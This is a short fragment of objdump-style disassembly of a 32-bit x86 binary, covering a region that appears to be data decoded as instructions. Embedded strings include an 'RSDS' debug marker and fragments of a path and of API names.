  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	(bad)  
  420fc5:	mov    BYTE PTR [ebx],al
  420fc7:	and    edi,ecx
  420fc9:	(bad)  
  420fca:	jle    0x421016
  420fcc:	lods   al,BYTE PTR ds:[esi]
  420fcd:	dec    ebp
  420fce:	pop    eax
  420fcf:	xchg   esi,eax
  420fd0:	lods   eax,DWORD PTR ds:[esi]
  420fd2:	(bad)  
  420fd3:	mov    ds:0x1,al
  420fd8:	inc    ebx
  420fd9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  420fdd:	jb     0x421051
  420fdf:	outs   dx,BYTE PTR gs:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
